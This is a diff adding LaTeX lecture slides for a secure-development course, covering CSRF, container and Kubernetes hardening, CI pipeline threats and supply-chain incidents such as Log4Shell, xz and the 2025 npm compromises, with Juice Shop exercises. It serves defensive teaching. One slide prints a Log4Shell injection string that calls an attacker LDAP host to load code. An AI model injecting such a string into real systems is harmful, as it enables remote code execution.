+\item Stateless software: \emph{double submit cookie} -- preferably the signed variant
+\begin{list2}
+\item Same token in a cookie and in a request parameter/header, server compares
+\item Naive variant broken if attacker can plant cookies (subdomain, MITM)
+\item Signed variant: HMAC with server secret, bound to session ID
+\end{list2}
+\item Defense in depth: \verb+SameSite+ cookies, Origin/Referer checks
+\end{list2}
+
+\url{https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html}
+
+\slide{CSRF in Django}
+
+\begin{minted}{html}
+<form method="post">{% csrf_token %}
+<input type="hidden" name="csrfmiddlewaretoken"
+value="kq3rT8vXbN2mWfL0pZcY7hJd4sEaUo9GiR1tVxQwBn6yMe5CjHlKgPzA0uIsDfOr">
+\end{minted}
+
+\begin{list2}
+\item Default: double submit cookie, \emph{not} signed
+\begin{list2}
+\item \verb+csrftoken+ cookie holds a random secret
+\item Form field \verb+csrfmiddlewaretoken+ is masked per request, only the secret is compared
+\end{list2}
+\item Plus Origin header check, and strict Referer check on HTTPS
+\end{list2}
+
+\url{https://docs.djangoproject.com/en/stable/ref/csrf/}
+
+\slide{Exercise: CSRF protection in Django and the OWASP patterns}
+
+\begin{list2}
+\item Read the Django CSRF documentation\\
+{\footnotesize\link{https://docs.djangoproject.com/en/stable/ref/csrf/}}
+
+\item Django makes it easy to implement CSRF tokens!
+%\item Which of the OWASP patterns does Django implement?
+
+\item Then check the framework you use: Spring, ASP.NET Core, Express, Angular, ...\\
+Is protection on by default? Which pattern?
+\end{list2}
+
+\breakdance
+
+
+% ======================================================================
+% Session 2
+% ======================================================================
+
+\slide{Session 2: Container security and hardening}
+\begin{list2}
+\item Container images -- layers, base images, what you actually ship
+\item Image hygiene -- minimal images, non-root, pinning, scanning, rebuilding
+\item Kubernetes security building blocks -- RBAC, service accounts, network policies, secrets
+\item Admission control and policy as code -- Pod Security Admission and Kyverno
+\vskip 1em
+\item Exercise: Kyverno Playground -- read and try policies in the browser
+\end{list2}
+
+
+\slide{Recap from 6-SDL-practices: isolation}
+
+\begin{list2}
+\item 6-SDL-practices, Session 4: chroot, jails, containers and sandboxes
+\item Pod Security Standards, profile \emph{restricted} -- do not run containers as root
+\item Systemd hardening -- same ideas outside containers
+\item Container and runc escapes -- every few years, again and again
+\item Malicious images on Docker Hub
+\vskip 1em
+\item Today: how to build better images and how to \emph{enforce} the rules in a cluster
+\end{list2}
+
+
+\slide{Docker Images and layers}
+
+\hlkimage{8cm}{container-layers.jpg}
+
+\begin{quote}
+A Docker image is built up from a series of layers. Each layer represents an instruction in the image’s Dockerfile. Each layer except the very last one is read-only.
+\end{quote}
+
+Source: {\footnotesize
+\link{https://docs.docker.com/storage/storagedriver/}}
+
+\begin{list2}
+\item Every layer is something you ship -- including the base image you did not build
+\end{list2}
+
+
+\slide{Image hygiene}
+
+\begin{list2}
+\item Small base images -- fewer packages, fewer CVEs, less for an attacker to use\\
+e.g. slim, Alpine, distroless -- no shell is a feature
+\item Multi-stage builds -- compilers and build tools stay out of the runtime image
+\item Run as a named non-root user -- \verb+USER app+ in the Dockerfile
+\item Pin base images by digest, not only by tag -- tags can move
+\item No secrets in images -- layers keep history, \verb+docker history+ shows it
+\item Scan images -- example scanner Trivy in exercises
+\item Rebuild regularly -- base images get security updates, your image does not
+\end{list2}
+
+
+\slide{Keeping Container Images secure}
+
+\begin{list2}
+\item \faWrench\ \verb+anchore+ open-source project that provides a centralized service for inspection, analysis, and certification of container images
+\link{https://github.com/anchore/anchore-engine}\\
+"As of 2023, Anchore Engine is no longer maintained. There will be no future versions released. Users are advised to use Syft and Grype."
+\item \faWrench\ \verb+Syft+ \link{https://github.com/anchore/syft} SBOM generation and \faWrench\ \verb+Grype+ \link{https://github.com/anchore/grype} vulnerability scanning -- alternatives to Trivy
+\item Allow direct download from the internet into your cluster, may become a problem\\
+-- use your own registry or a pull-through proxy
+\item Malicious people are typosquatting popular containers!
+\item Supply chain attacks in general are a problem
+\end{list2}
+
+\slide{Example Dockerfile}
+
+\begin{minted}[fontsize=\footnotesize]{docker}
+# Build stage -- compilers and dev dependencies stay here
+FROM node:22-bookworm AS build
+WORKDIR /app
+COPY package.json package-lock.json ./
+RUN npm ci --ignore-scripts
+COPY . .
+RUN npm run build
+
+# Runtime stage -- small image, non-root user
+FROM node:22-bookworm-slim
+WORKDIR /app
+COPY --from=build /app/dist ./dist
+COPY --from=build /app/node_modules ./node_modules
+USER node
+CMD ["node", "dist/server.js"]
+\end{minted}
+
+\begin{list2}
+\item \verb+npm ci+ installs exactly what the lockfile says
+\item Production: pin \verb+FROM+ with \verb+@sha256:...+ digest
+\end{list2}
+
+
+\slide{Kubernetes security building blocks}
+
+\begin{list2}
+\item RBAC -- Roles and ClusterRoles, bound to users, groups and service accounts
+\item Service accounts -- every pod gets one, often with a token it does not need\\
+\verb+automountServiceAccountToken: false+ when the pod does not talk to the API
+\item Namespaces -- a unit for RBAC, quotas and policies, not a strong security boundary
+\item Network policies -- default deny, then allow what is needed\\
+requires a CNI that enforces them
+\item Secrets -- base64 is not encryption, enable encryption at rest, limit who can read
+\item Security context -- non-root, read-only root filesystem, drop capabilities
+\end{list2}
+
+{\footnotesize\link{https://kubernetes.io/docs/concepts/security/}}
+
+\slide{Restricting the Kubernetes API}
+
+\begin{quote}{\bf
+By default, the Kubernetes API server listens on port 6443 on the first non-localhost network interface, protected by TLS}. In a typical production Kubernetes cluster, the API serves on port 443. The port can be changed with the --secure-port, and the listening IP address with the --bind-address flag.
+
+...
+
+If your cluster uses a {\bf private certificate authority, you need a copy of that CA certificate configured into your ~/.kube/config on the client}, so that you can trust the connection and be confident it was not intercepted.
+\end{quote}
+
+\begin{list2}
+\item If an attacker can run kubectl with credentials -- they can do anything their role allows
+\item Defense in Depth is suggested -- so restrict at multiple levels
+\item Only allow connections from specific networks -- firewall filtering,\\
+managed clusters: private endpoint or authorized networks
+\item Use TLS and verify/copy certificates
+\item Kubeconfig files are credentials -- keep them out of Git, like any other secret
+\end{list2}
+
+
+\slide{RBAC, groups and Namespace}
+
+\begin{quote}
+Kubernetes starts with three initial namespaces:
+\begin{list2}
+\item[*] default The default namespace for objects with no other namespace
+\item[*] kube-system The namespace for objects created by the Kubernetes system
+\item[*] kube-public This namespace is created automatically and is readable by all users (including those not authenticated).
+\end{list2}
+\end{quote}
+Source: \link{https://kubernetes.io/docs/tasks/administer-cluster/namespaces/}
+
+\begin{list2}
+\item I like namespaces, easy way to isolate stuff
+\item Allow for quotas -- don't allow a test application to use all resources
+\item Easy network segregation -- network policies
+\item Allows easy data isolation -- who can access sensitive data
+\item I recommend groups, namespaces and roles for granting access -- {\bf do not grant permission to named users!}
+\end{list2}
+
+
+\slide{RBAC Audit tools}
+
+Multiple tools exist -- I most often only link open source tools in my presentations, feel free to suggest others
+\begin{list2}
+\item \faWrench\ \verb+rbac-tool+ -- A collection of Kubernetes RBAC tools to sugar coat Kubernetes RBAC complexity\\
+\link{https://github.com/alcideio/rbac-tool}
+
+\item \faWrench\ \verb+KubiScan+ -- a tool by Eviatar Gerzi to scan Kubernetes cluster for risky RBAC permissions \link{https://github.com/cyberark/KubiScan}
+\item \faWrench\ \verb+krane+ -- a Kubernetes RBAC static analysis and visualisation tool \link{https://github.com/appvia/krane}
+\item \faWrench\ \verb+rbac-view+ and \verb+rback+ -- visualise RBAC as HTML or graphs
+\item Built in: \verb+kubectl auth can-i --list+ -- what can I do?\\
+\verb+kubectl auth can-i --list --as=system:serviceaccount:juice-shop:default+
+\item What is best current practice? More tools and articles available at:
+\link{https://rbac.dev/}
+\end{list2}
+
+You MUST control your permissions, so find the tools that work for you!
+
+
+\slide{Example: default deny network policy}
+
+\begin{minted}[fontsize=\footnotesize]{yaml}
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny
+  namespace: juice-shop
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+\end{minted}
+
+\begin{list2}
+\item Selects all pods in the namespace, allows nothing -- then add specific allow rules
+\item Egress matters too -- Log4Shell needed an outbound connection
+\item Remember DNS when restricting egress
+\end{list2}
+
+\slide{Cilium overview}
+
+\hlkimage{11cm}{cilium-overview.png}
+
+\begin{quote}
+Kubernetes provides Network Policies for controlling traffic going in and out of the pods. Cilium implements the Kubernetes Network Policies for L3/L4 level and extends with L7 policies for granular API-level security for common protocols such as HTTP, Kafka, gRPC, etc
+\end{quote}
+Source: picture and text from \link{https://cilium.io/blog/2018/09/19/kubernetes-network-policies/}
+
+\begin{list2}
+\item Network policies are only enforced if the CNI supports them -- Cilium and Calico do
+\end{list2}
+
+
+\slide{Network Policy Editor for Kubernetes}
+
+\hlkimage{18cm}{cilium-editor-ui.png}
+
+\begin{list2}
+\item Nice Editor for Policies \link{https://editor.cilium.io/}
+\item Recommendation: always specify a Network Policy - be specific, who CAN access
+\item Make positive lists - as normally only a limited number of other resources will need access
+\item Then also make sure to specify an egress policy - so both ingress and egress rules
+\end{list2}
+
+
+\slide{Example Network Policy}
+
+\begin{minipage}[t]{0.48\textwidth}
+\begin{minted}[fontsize=\scriptsize]{yaml}
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: example-policy
+  namespace: juice-shop
+spec:
+  podSelector: {}   # all pods in namespace
+  policyTypes:
+  - Ingress
+  - Egress
+  ingress:
+  - from:
+    - ipBlock:
+        cidr: 185.129.60.123/32
+    ports:
+    - port: 80
+      protocol: TCP
+    - port: 443
+      protocol: TCP
+\end{minted}
+\end{minipage}\hfill
+\begin{minipage}[t]{0.48\textwidth}
+\begin{minted}[fontsize=\scriptsize]{yaml}
+  # continued -- DNS only,
+  # all other egress denied
+  egress:
+  - to:
+    - namespaceSelector:
+        matchLabels:
+          kubernetes.io/metadata.name: kube-system
+      podSelector:
+        matchLabels:
+          k8s-app: kube-dns
+    ports:
+    - port: 53
+      protocol: UDP
+    - port: 53
+      protocol: TCP
+\end{minted}
+\end{minipage}
+
+{\footnotesize\link{https://kubernetes.io/docs/concepts/services-networking/network-policies/}}
+
+\slide{Admission control -- enforce rules before things run}
+
+\begin{list2}
+\item Admission controllers check every request to the Kubernetes API -- before objects are stored
+\item Pod Security Admission -- built in, enforces Pod Security Standards per namespace\\
+\verb+pod-security.kubernetes.io/enforce=restricted+
+\item Policy engines for more: Kyverno, OPA Gatekeeper
+\begin{list2}
+\item Only images from our own registry
+\item Images must be signed
+\item Required labels, resource limits, no \verb+latest+ tag
+\end{list2}
+\item Same idea as Git hooks -- stop it at the gate, not after the fact
+\item Start in audit mode, look at the reports, then enforce
+\end{list2}
+
+
+\slide{Kyverno -- policy as code}
+
+\hlkimage{4cm}{kyverno-horizontal.png}
+% TODO: add kyverno-logo.png to images, or remove the image line
+
+\begin{list2}
+\item Kubernetes native policy engine -- policies are Kubernetes resources in YAML
+\item Validate -- reject or report resources that break the rules
+\item Mutate -- change resources, e.g. add a default security context
+\item Generate -- create resources, e.g. a default network policy in every new namespace
+\item Verify images -- check signatures before a pod runs
+\item Can also run in CI with the Kyverno CLI -- same policies before and after deploy
+\end{list2}
+
+{\footnotesize\link{https://kyverno.io/docs/}\\
+Policy library: \link{https://kyverno.io/policies/}}
+
+
+\slide{Example Kyverno policy}
+
+\begin{minted}[fontsize=\scriptsize]{yaml}
+apiVersion: kyverno.io/v1
+kind: ClusterPolicy
+metadata:
+  name: require-run-as-nonroot
+spec:
+  validationFailureAction: Audit   # change to Enforce when ready
+  rules:
+  - name: run-as-non-root
+    match:
+      any:
+      - resources:
+          kinds:
+          - Pod
+    validate:
+      message: "Containers must run as non-root."
+      pattern:
+        spec:
+          securityContext:
+            runAsNonRoot: true
+\end{minted}
+
+Simplified example -- field names differ between Kyverno versions, use the maintained policies from the library
+
+
+\slide{Exercise: Kyverno Playground}
+
+\begin{list2}
+\item Open the Kyverno Playground -- runs in your browser, no cluster needed\\
+{\footnotesize\link{https://playground.kyverno.io/}}
+\item Follow the built-in tutorial
+\item Load a policy from the catalog, e.g. from the Pod Security Standards category
+\item Paste the Juice Shop pod spec -- does it pass?\\
+Remove \verb+runAsNonRoot+ -- what happens?
+\item Browse the policy library \link{https://kyverno.io/policies/}
+
+\item Exercise later on real K8s\\
+ Start with the Pod Security Standards policies:
+disallow privileged, host namespaces, hostPath; require non-root\\
+apply \verb+disallow-privileged-containers+ in Enforce mode,
+      then try to deploy a privileged pod -- what happens?
+  \end{list2}
+
+
+\breakdance
+
+
+% ======================================================================
+% Session 3
+% ======================================================================
+
+\slide{Session 3: Tools and pipelines}
+\begin{list2}
+\item Where tools run -- editor, pre-commit, pre-push, CI, registry, admission, runtime
+\item Many tools in one -- scanner aggregators like MegaLinter
+\item The pipeline is a production system -- it has secrets and deploy rights
+\item Case: tj-actions/changed-files, March 2025
+\item Pinning -- tags move, commit SHAs and digests do not
+\vskip 1em
+\item Exercise: threat-model your pipeline
+\end{list2}
+
+
+\slide{Where do the tools run?}
+
+\begin{list2}
+\item Editor / IDE -- linters, fast feedback, developer's choice
+\item Pre-commit and pre-push hooks -- secret scanning, formatting, Semgrep
+\item CI on pull request -- SAST, dependency scanning, tests, quality gates
+\item Build -- SBOM generation, image scanning, signing
+\item Registry -- rescan stored images when new CVEs appear
+\item Admission -- Kyverno and Pod Security
+\item Runtime -- monitoring and detection
+\vskip 1em
+\item Shift left -- find it early. But also: shift right -- some things are only visible in production
+\end{list2}
+
+
+\slide{You probably already have tools}
+
+\begin{list2}
+\item Secret scanning, push protection, SonarQube, Dependabot or Renovate, ...
+\item Adding tool number 11 is rarely the most important next step
+\item Questions to ask about the tools you have:
+\begin{list2}
+\item Does a finding block the merge -- or only produce a report nobody reads?
+\item Who triages the findings, and how fast?
+\item Which rules are actually enabled?
+\item Can a developer bypass or disable the check -- and is that logged?
+\end{list2}
+\item A Fool with a Tool is still a Fool
+\end{list2}
+
+
+\slide{Many tools in one -- MegaLinter}
+
+\begin{list2}
+\item MegaLinter runs many linters and scanners in one container, in CI or locally
+\item Has a security flavor with tools like:
+\begin{list2}
+\item Secrets: gitleaks, secretlint
+\item Code: semgrep, bandit, devskim
+\item Dependencies and SBOM: trivy, syft
+\item Infrastructure as code: checkov, kics, tflint, hadolint for Dockerfiles
+\end{list2}
+\item Results in SARIF -- can be shown in GitHub, GitLab and others
+\vskip 1em
+\item Convenient -- and one dependency that pulls in dozens of tools\\
+What did you just trust? Who updates them?
+\end{list2}
+
+\link{https://megalinter.io/}
+
+
+\slide{Infrastructure as code}
+
+\begin{quote}
+{\bf Infrastructure as code (IaC)} is the process of managing and provisioning computer data centers through machine-readable definition files, rather than physical hardware configuration or interactive configuration tools.[1] The IT infrastructure managed by this comprises both physical equipment such as bare-metal servers as well as virtual machines and associated configuration resources. The definitions may be in a version control system. It can use either scripts or declarative definitions, rather than manual processes, but the term is more often used to promote declarative approaches.
+\end{quote}
+Source: {\footnotesize
+\link{https://en.wikipedia.org/wiki/Infrastructure_as_code}}
+
+\begin{list2}
+\item Has become the norm in many places
+\item IaC is code -- review it, scan it, keep it in Git like the application
+\item Kubernetes YAML, Terraform, Ansible, Dockerfiles, CI workflow files
+\end{list2}
+
+
+\slide{The pipeline is a production system}
+
+\begin{list1}
+\item A CI/CD pipeline can read your source code, holds secrets,\\
+and can deploy to production -- often with more rights than any developer
+\item Attack paths into the pipeline:
+\begin{list2}
+\item Change the workflow file -- who can do that, is it reviewed?
+\item Pull requests from forks -- can they reach secrets?
+\item Third-party actions, plugins and images -- code you run with your secrets
+\item Self-hosted runners -- shared between projects, reused between jobs?
+\item Long-lived tokens -- cloud keys, registry and package publishing tokens
+\end{list2}
+\item Same principles as everywhere else: least privilege, separation, logging
+\end{list1}
+
+
+\slide{Case: tj-actions/changed-files -- March 2025}
+
+\begin{list2}
+\item Popular GitHub Action, used in more than 23,000 repositories
+\item Attackers got write access and moved most existing version tags to a malicious commit
+\item The malicious code read secrets from the runner process memory\\
+and printed them, encoded, in the workflow logs
+\item Public repositories = public logs = leaked secrets
+\item Detected by StepSecurity 14 March 2025, CVE-2025-30066, on CISA KEV
+\vskip 1em
+\item Workflows referencing \verb+@v35+ or \verb+@v45+ got the malicious code automatically
+\item Workflows pinned to a full commit SHA did not
+\end{list2}
+
+{\footnotesize\link{https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction}}
+
+
+\slide{Pinning -- tags move, hashes do not}
+
+\begin{minted}[fontsize=\footnotesize]{yaml}
+steps:
+  # Tag -- can be moved by whoever controls the repository
+  - uses: some-org/some-action@v4
+
+  # Full commit SHA -- immutable, comment shows the version
+  - uses: some-org/some-action@0123456789abcdef0123456789abcdef01234567 # v4.2.1
+\end{minted}
+
+\begin{list2}
+\item Same for container images: \verb+image: nginx:1.27+ vs \verb+image: nginx@sha256:...+
+\item Same for dependencies: lockfiles
+\item Pinning means you must update deliberately -- Dependabot and Renovate can update pins
+\item Give the workflow token only the permissions it needs -- read by default
+\end{list2}
+
+
+\slide{Exercise: threat-model your pipeline}
+
+Think about one of your own pipelines and see if you can answer:
+\begin{list2}
+\item Who can change the pipeline/workflow files -- is that reviewed like other code?
+\item Which secrets can a job reach -- and can a pull request from a fork reach them?
+\item Are third-party actions, plugins and images pinned to a commit SHA or digest,\\
+or to a tag that can be moved?
+\item If you added MegaLinter tomorrow: how many tools would you implicitly trust,\\
+who updates them, and where do the results go?
+\item What would happen if one of these tools was compromised, like tj-actions?
+\end{list2}
+
+The answers are about permissions, pinning and isolation -- not about which scanner to add.
+
+\breakdance
+
+
+% ======================================================================
+% Session 4
+% ======================================================================
+
+\slide{Session 4: Supply chain and vulnerability management}
+\begin{list2}
+\item OWASP Top 10:2025 -- A03 Software Supply Chain Failures
+\item Third-party dependencies -- Log4Shell
+\item Attacks on the supply chain -- xz, npm September 2025, hardware implants
+\item Continuous Vulnerability Management -- inventory, SBOM, OSV, prioritize, patch
+\vskip 1em
+\item Exercise: npm audit and osv-scanner on Juice Shop -- before and after the break
+\end{list2}
+
+
+\slide{Exploiting Third-Party Dependencies}
+
+\begin{quote}
+The rampant use of third-party dependencies, in particular from the OSS realm, has created an easy-to-overlook gap in the security of many web applications. A hacker, bug bounty hunter, or penetration tester can take advantage of these integrations and jumpstart their search for live vulnerabilities. Third-party dependencies can be attacked a number of ways, from shoddy integrations to fourth-party code or just by finding known exploits discovered by other researchers or companies.
+\end{quote}
+Source: \emph{Web Application Security}, Andrew Hoffman, chapter 15
+
+\begin{list2}
+\item Be careful what you include in your environment
+\item Two different problems:
+\begin{list2}
+\item Vulnerable dependencies -- honest mistakes, get a CVE, need patching
+\item Malicious dependencies -- the supply chain itself is attacked
+\end{list2}
+\end{list2}
+
+
+\slide{November 2021: Log4Shell}
+\begin{quote}\small
+It would not be possible to discuss 2021 in the context of vulnerabilities without the mention of Log
+4Shell. {\bf A widely used Java-based logging library caused headaches for Security professionals worldwide}. Many scrambled to quantify their use of Log4j within their estates.
+
+A zero-day exploit quickly followed, confirming the worst - {\bf Remote Code Execution (RCE) was indeed possible.} However, what made the nature of the vulnerability even more challenging was the ability to exploit a backend logging system from an unaffected front end host. For example, an attacker can craft a weaponised log entry on a mobile app or webserver not running Log4j. The attacker could make their way through to backend middleware itself running Log4j, which significantly extends the attack surface of the vulnerability.
+
+The NCSC even took the step of recommending the update was immediately applied, whether or not Log4Shell was known to be in use. As is commonly the case with critical vulnerabilities, two successive Log4j patches were subsequently released in the week following the original addressing Denial of Service (DoS) and a further RCE. This further increased workloads of Security and IT teams just as they thought the worst of 2021 had been and gone.
+\end{quote}
+Source - for this description:\\
+\link{https://chessict.co.uk/resources/blog/posts/2022/january/2021-top-security-vulnerabilities/}
+
+See also \link{https://en.wikipedia.org/wiki/Log4Shell}
+
+
+\slide{Log4Shell -- what it taught us}
+
+\begin{list2}
+\item CVE-2021-44228 -- a log message like \verb+${jndi:ldap://attacker/a}+ made Log4j\\
+connect out and load code
+\item First question everywhere: \emph{do we use Log4j?} -- most could not answer quickly
+\item Log4j was often a dependency of a dependency, or inside a vendor product
+\item Lessons:
+\begin{list2}
+\item Know what you run -- inventory and SBOM
+\item Be able to patch and redeploy fast
+\item Restrict outbound traffic from servers -- the exploit needed to connect out
+\item Monitor -- the callbacks were visible in network logs
+\end{list2}
+\end{list2}
+
+
+\slide{xz backdoor -- found by a PostgreSQL developer}
+
+\begin{list2}
+\item March 2024, Andres Freund, PostgreSQL developer at Microsoft, benchmarking PostgreSQL on Debian unstable
+\item SSH logins used more CPU and took longer than expected -- he investigated
+\item Found a backdoor in xz/liblzma 5.6.0 and 5.6.1 -- CVE-2024-3094, CVSS 10
+\item sshd does not use liblzma directly -- distributions patch sshd for systemd notification,\\
+and libsystemd pulls in liblzma
+\item The backdoor allowed remote code execution for whoever had the attacker's private key
+\item Caught before it reached stable releases of the big distributions
+\end{list2}
+
+{\footnotesize\link{https://www.openwall.com/lists/oss-security/2024/03/29/4}}
+
+
+\slide{xz -- the long game}
+
+\begin{list2}
+\item The attacker ``Jia Tan'' contributed to xz for about two years
+\item Gained trust, then commit access, then release manager rights
+\item Pressure on the overworked original maintainer from other accounts -- social engineering
+\item The payload was hidden in binary test files, and the code that activated it\\
+was only in the release tarballs -- not in the Git repository
+\vskip 1em
+\item Lessons:
+\begin{list2}
+\item Critical infrastructure maintained by one tired volunteer
+\item Reviewing the Git repository is not enough -- the tarball was different
+\item Reproducible builds help detect this
+\item Found by someone who cared about 500 milliseconds -- performance monitoring is security monitoring
+\end{list2}
+\end{list2}
+
+
+\slide{npm September 2025 -- chalk and debug}
+
+\begin{list2}
+\item 8 September 2025: maintainer Josh Junon (qix) receives a phishing mail from \verb+npmjs.help+
+\item The mail claimed his 2FA had to be updated or the account would be locked
+\item Attackers published malicious versions of 18 packages -- including \verb+chalk+ and \verb+debug+\\
+together more than 2 billion weekly downloads
+\item Payload: in browsers, replaced crypto wallet addresses in transactions with the attacker's
+\item Detected within hours by Aikido Security, removed the same day
+\vskip 1em
+\item Anyone running \verb+npm install+ without a lockfile in that window could get the malicious version
+\end{list2}
+
+
+\slide{Shai-Hulud -- the first npm worm, September 2025}
+
+\begin{list2}
+\item Discovered 14--15 September 2025, first seen in \verb+@ctrl/tinycolor+
+\item Runs at install time -- \verb+postinstall+ script
+\item Steals credentials -- runs TruffleHog on the filesystem, checks cloud metadata endpoints
+\item Publishes the stolen secrets to public GitHub repositories named Shai-Hulud
+\item Adds a GitHub Actions workflow to exfiltrate secrets from CI
+\item Self-replicates: uses stolen npm tokens to publish infected versions of the victim's own packages
+\item Hundreds of packages compromised, a second wave Shai-Hulud 2.0 in November 2025
+\end{list2}
+
+{\footnotesize\link{https://sysdig.com/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages/}}
+
+
+\slide{Supply chain attacks also hit hardware}
+% TODO: check latest Ledger updates before the course -- investigation ongoing October 2026
+
+\begin{list2}
+\item October 2026: Ledger hardware wallets sold through the reseller CryptoBilis\\
+(Malaysia, Indonesia, Philippines) contained an added hardware implant
+\item The implant reads the 24-word recovery phrase from the screen during setup\\
+and sends it out over LTE using a tiny eSIM
+\item Battery replaced with a smaller one to make room for MCU, eSIM and LTE module
+\item The device's Genuine Check passed -- it verifies the Secure Element, which was untouched
+\item Third-party estimates: 86--93 million USD from more than 300 wallets, not confirmed by Ledger
+\vskip 1em
+\item Integrity checks verify what they know about -- not the box around it
+\item Who did you buy from? Supply chain includes resellers
+\end{list2}
+
+
+\slide{Defences against malicious dependencies -- configure}
+
+Commit a \verb+.npmrc+ in the project:
+\begin{minted}{ini}
+ignore-scripts=true      # no install scripts -- how Shai-Hulud ran
+min-release-age=7        # days, skip versions younger than a week
+\end{minted}
+
+\begin{list2}
+\item CI runs \verb+npm ci+, never \verb+npm install+ -- fails if lockfile
+      and \verb+package.json+ disagree
+\item Same idea in other tools: pnpm \verb+minimumReleaseAge+ (minutes),
+      Yarn \verb+npmMinimalAgeGate+
+\item Renovate/Dependabot: set a cooldown on update PRs
+\end{list2}
+
+\slide{Defences against malicious dependencies -- process}
+
+\begin{list2}
+\item Count what you trust: \verb+npm ls --all | wc -l+
+\item Review update PRs like code: new maintainer? new install script?
+      version published outside the normal release flow?
+\item Publishing: hardware key (FIDO2) MFA on npm, no long-lived tokens on laptops or in CI
+\item Internal proxy registry -- one place to block a bad version for everyone
+\end{list2}
+
+
+
+\slide{Inventory and Control of Software Assets}
+
+\begin{quote}
+CIS Control 2:\\
+Inventory and Control of Software Assets\\
+Actively manage (inventory, track, and correct) all software on the network so that only authorized software is installed and can execute, and that all unauthorized and unmanaged software is found and prevented from installation or execution.
+\end{quote}
+
+\begin{list1}
+\item What versions of software do we depend on?
+\item What software needs to be phased out, upgraded?
+\item SBOM -- Software Bill of Materials, a machine-readable list of components\\
+formats CycloneDX and SPDX, generated by tools like syft and trivy
+\item EU Cyber Resilience Act -- manufacturers must keep an SBOM
+\end{list1}
+
+Source: Center for Internet Security CIS Controls 7.1 CIS-Controls-Version-7-1.pdf
+
+
+\slide{Continuous Vulnerability Management}
+
+\begin{quote}
+CIS Control 3:\\
+Continuous Vulnerability Management\\
+Continuously acquire, assess, and take action on new information in order to identify vulnerabilities, remediate, and minimize the window of opportunity for attackers.
+\end{quote}
+
+\begin{list1}
+\item Acquire -- CVE feeds, vendor advisories, OSV, scanners in CI and registry
+\item Assess -- not all critical CVEs are critical for you: reachable? exposed? exploited?\\
+CISA Known Exploited Vulnerabilities (KEV) catalog helps prioritize
+\item Act -- patch, upgrade, mitigate, or accept the risk with a documented reason
+\item Continuously -- an image that was clean last month is not clean today
+\end{list1}
+
+Source: Center for Internet Security CIS Controls 7.1 CIS-Controls-Version-7-1.pdf
+
+
+\slide{OSV -- vulnerabilities and malicious packages}
+
+\begin{list2}
+\item OSV -- Open Source Vulnerabilities, a database and a format, covering many ecosystems\\
+npm, PyPI, Maven, Go, crates.io, Debian, ...
+\item Vulnerabilities have IDs like \verb+CVE-+ and \verb+GHSA-+
+\item Malicious packages have IDs starting with \verb+MAL-+\\
+from the OpenSSF Malicious Packages repository
+\item \verb+osv-scanner+ -- scans lockfiles, SBOMs and directories against OSV
+\item \verb+npm audit+ -- uses the GitHub Advisory Database
+\end{list2}
+
+{\footnotesize\link{https://osv.dev/}\\
+\link{https://github.com/ossf/malicious-packages}\\
+\link{https://google.github.io/osv-scanner/}}
+
+
+\slide{Exercise: npm audit and osv-scanner on Juice Shop}
+
+\begin{list2}
+\item Clone Juice Shop -- look at \verb+.npmrc+: why is there no lockfile?
+\item Create a lockfile without installing anything:\\
+{\footnotesize\verb+npm install --package-lock-only --package-lock=true --ignore-scripts+}
+\item Why \verb+--ignore-scripts+? Install scripts are how Shai-Hulud spread
+\item Run \verb+npm audit+ -- how many, how severe?
+\item Then \verb+osv-scanner scan source -L package-lock.json+ -- same results?
+\end{list2}
+
+Details in the exercise booklet. Part 1 now, part 2 after the break.
+
+\breakdance
+
+
+\slide{Exercise part 2: what if it was 8 September 2025?}
+
+\begin{list2}
+\item Compare your \verb+npm audit+ result with your neighbour -- same number?\\
+Why not? The lockfile was resolved today, from version ranges
+\item Find \verb+debug+ and \verb+chalk+ in your lockfile -- which versions?
+\item What would \verb+npm install+ have given you on 8 September 2025?
+\item What protects you: a committed lockfile, \verb+npm ci+, \verb+--ignore-scripts+, waiting a few days?
+\item Which of these do your own projects use today?
+\end{list2}
+
+\slide{8 September 2025 -- the malicious versions}
+
+\begin{list2}
+\item 18 packages from the same maintainer account, among them:\\
+\verb+debug 4.4.2+, \verb+chalk 5.6.1+, \verb+ansi-styles 6.2.2+, \verb+supports-color 10.2.1+,\\
+\verb+strip-ansi 7.1.1+, \verb+ansi-regex 6.2.1+, \verb+wrap-ansi 9.0.1+,\\
+\verb+color-convert 3.1.1+, \verb+color-name 2.0.1+, \verb+slice-ansi 7.1.1+, \verb+error-ex 1.3.3+
+\item Each was published as the newest version -- matching \verb+^+ ranges everywhere
+\item Removed within hours -- \verb+debug 4.4.2+ was already gone the same afternoon
+\item Clean versions published on top: e.g. \verb+chalk 5.6.2+, \verb+ansi-styles 6.2.3+, \verb+strip-ansi 7.1.2+
+\vskip 1em
+\item Check your own lockfile:\\
+{\footnotesize\verb+grep -A2 '"node_modules/debug"' package-lock.json+}
+\end{list2}
+
+
+\slide{Juice Shop on 8 September 2025?}
+
+{\small
+\begin{tabular}{p{4cm}p{5.5cm}p{3cm}p{7.5cm}}
+\textbf{Package} & \textbf{In lockfile today} & \textbf{Malicious} & \textbf{Dependents with a range that includes it}\\\hline
+debug & 2.6.9, 3.2.7, \textbf{4.4.3} & 4.4.2 & 32 of 45\\
+strip-ansi & 5.2.0, 6.0.1, \textbf{7.2.0} & 7.1.1 & 9 of 22\\
+ansi-styles & 3.2.1, 4.3.0, \textbf{6.2.3} & 6.2.2 & 4 of 13\\
+wrap-ansi & 5.1.0, 6.2.0, 8.1.0, 9.0.2 & 9.0.1 & 2 of 6\\
+color-name & 1.1.3, 1.1.4, 2.1.1 & 2.0.1 & 2 of 9\\
+slice-ansi & 7.1.2, 8.0.0 & 7.1.1 & 1 of 2\\
+error-ex & 1.3.4 & 1.3.3 & 1 of 1\\
+chalk & 2.4.2, 4.1.2 & 5.6.1 & 0 of 5\\
+\end{tabular}
+}
+
+\begin{list2}
+\item Not chalk -- Juice Shop only uses chalk 2 and 4
+\item But almost certainly \verb+debug 4.4.2+ -- 4.4.3 was only published after the cleanup
+\item Caveat: today's dependency tree, generated October 2026 -- indicative, not an exact replay
+\end{list2}
+
+
+\slide{What would have protected Juice Shop?}
+
+\begin{list2}
+\item A committed lockfile with \verb+npm ci+ -- you get what was reviewed, not what is newest\\
